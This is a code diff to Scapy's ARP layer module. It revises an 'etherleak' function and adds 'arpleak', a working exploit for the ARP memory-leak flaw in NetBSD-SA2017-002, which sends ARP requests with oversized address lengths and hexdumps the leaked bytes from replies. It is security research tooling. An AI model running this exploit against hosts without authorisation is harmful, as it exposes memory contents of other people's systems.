@@ -21,12 +21,14 @@ from scapy.data import *
 from scapy.compat import *
 from scapy.packet import *
 from scapy.ansmachine import *
-from scapy.plist import SndRcvList
+from scapy.plist import PacketList, SndRcvList
 from scapy.fields import *
 from scapy.sendrecv import srp, srp1, srpflood
 from scapy.arch import get_if_hwaddr
-from scapy.utils import inet_ntoa, inet_aton, valid_mac, valid_net, valid_net6
+from scapy.utils import inet_ntoa, inet_aton, valid_mac, valid_ip, valid_net, \
+    valid_net6
 from scapy.error import warning
+from scapy.modules.six import viewitems
 if conf.route is None:
     # unused import, only to initialize conf.route
     import scapy.route
@@ -700,6 +702,59 @@ class ARP_am(AnsweringMachine):
 @conf.commands.register
 def etherleak(target, **kargs):
     """Exploit Etherleak flaw"""
-    return srpflood(Ether() / ARP(pdst=target),
-                    prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load),
-                    filter="arp", **kargs)
+    return srp(Ether() / ARP(pdst=target),
+               prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load),
+               filter="arp", **kargs)
+
+
+@conf.commands.register
+def arpleak(target, plen=255, hwlen=255, **kargs):
+    """Exploit ARP leak flaws, like NetBSD-SA2017-002.
+
+https://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2017-002.txt.asc
+
+    """
+    # We want explicit packets
+    pkts_iface = {}
+    for pkt in ARP(pdst=target):
+        # We have to do some of Scapy's work since we mess with
+        # important values
+        iface = conf.route.route(pkt.pdst)[0]
+        psrc = get_if_addr(iface)
+        hwsrc = get_if_hwaddr(iface)
+        pkt.plen = plen
+        pkt.hwlen = hwlen
+        if plen == 4:
+            pkt.psrc = psrc
+        else:
+            pkt.psrc = inet_aton(psrc)[:plen]
+            pkt.pdst = inet_aton(pkt.pdst)[:plen]
+        if hwlen == 6:
+            pkt.hwsrc = hwsrc
+        else:
+            pkt.hwsrc = mac2str(hwsrc)[:hwlen]
+        pkts_iface.setdefault(iface, []).append(
+            Ether(src=hwsrc, dst=ETHER_BROADCAST) / pkt
+        )
+    ans, unans = SndRcvList(), PacketList(name="Unanswered")
+    for iface, pkts in viewitems(pkts_iface):
+        ans_new, unans_new = srp(pkts, iface=iface, filter="arp", **kargs)
+        ans += ans_new
+        unans += unans_new
+        ans.listname = "Results"
+        unans.listname = "Unanswered"
+    for _, rcv in ans:
+        if ARP not in rcv:
+            continue
+        rcv = rcv[ARP]
+        psrc = rcv.get_field('psrc').i2m(rcv, rcv.psrc)
+        if plen > 4 and len(psrc) > 4:
+            print("psrc")
+            hexdump(psrc[4:])
+            print()
+        hwsrc = rcv.get_field('hwsrc').i2m(rcv, rcv.hwsrc)
+        if hwlen > 6 and len(hwsrc) > 6:
+            print("hwsrc")
+            hexdump(hwsrc[6:])
+            print()
+    return ans, unans
